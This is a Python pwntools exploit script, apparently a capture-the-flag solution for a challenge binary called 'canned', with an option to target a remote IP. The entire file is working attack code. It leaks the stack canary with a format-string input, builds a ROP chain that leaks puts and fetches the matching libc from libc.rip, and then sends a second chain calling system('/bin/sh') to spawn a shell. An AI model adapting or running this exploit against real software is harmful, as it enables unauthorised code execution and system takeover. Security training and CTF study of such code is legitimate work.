#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./canned')
context.log_level = 'INFO'
libc_index = 0

while True:
	if args.REMOTE:
		p = remote('35.238.225.156', 1007)
	else:
		p = process(binary.path)
		libc = binary.libc

	p.sendlineafter('Say something please\n', '%15$p')
	_ = p.recvline().strip()
	canary = int(_,16)
	log.info('canary: ' + hex(canary))

	rop = ROP([binary])
	pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

	payload  = b''
	payload += (0x28 - 0x10) * b'A'
	payload += p64(canary)
	payload += (0x28 - len(payload)) * b'B'
	payload += p64(pop_rdi)
	payload += p64(binary.got.puts)
	payload += p64(binary.plt.puts)
	payload += p64(binary.sym.main)

	p.sendlineafter('That ain\'t it, try something else maybe\n',payload)
	p.recvline()

	_ = p.recv(6)
	puts = u64(_ + b'\0\0')
	log.info('puts: ' + hex(puts))

	if not 'libc' in locals():
		import requests
		r = requests.post('https://libc.rip/api/find', json = {'symbols':{'puts':hex(puts)[-3:]}})
		while True:
			libc_url = r.json()[libc_index]['download_url']
			if context.arch in libc_url:
				break
			libc_index += 1
		log.info('libc_url: ' + libc_url)
		libc_file = libc_url.split('/')[-1:][0]
		if not os.path.exists(libc_file):
			log.info('getting: ' + libc_url)
			r = requests.get(libc_url, allow_redirects=True)
			open(libc_file,'wb').write(r.content)
		libc = ELF(libc_file)

	libc.address = puts - libc.sym.puts
	log.info('libc.address: ' + hex(libc.address))

	p.sendlineafter('Say something please\n', 'something')
	p.recvline()

	payload  = b''
	payload += (0x28 - 0x10) * b'A'
	payload += p64(canary)
	payload += (0x28 - len(payload)) * b'B'
	payload += p64(pop_rdi + 1)
	payload += p64(pop_rdi)
	payload += p64(libc.search(b'/bin/sh').__next__())
	payload += p64(libc.sym.system)

	p.sendlineafter('That ain\'t it, try something else maybe\n',payload)

	try:
		p.recvline()
		time.sleep(1)
		p.sendline('echo shell')
		if b'shell' in p.recvline():
			p.interactive()
			break
	except:
		libc_index += 1
		p.close()
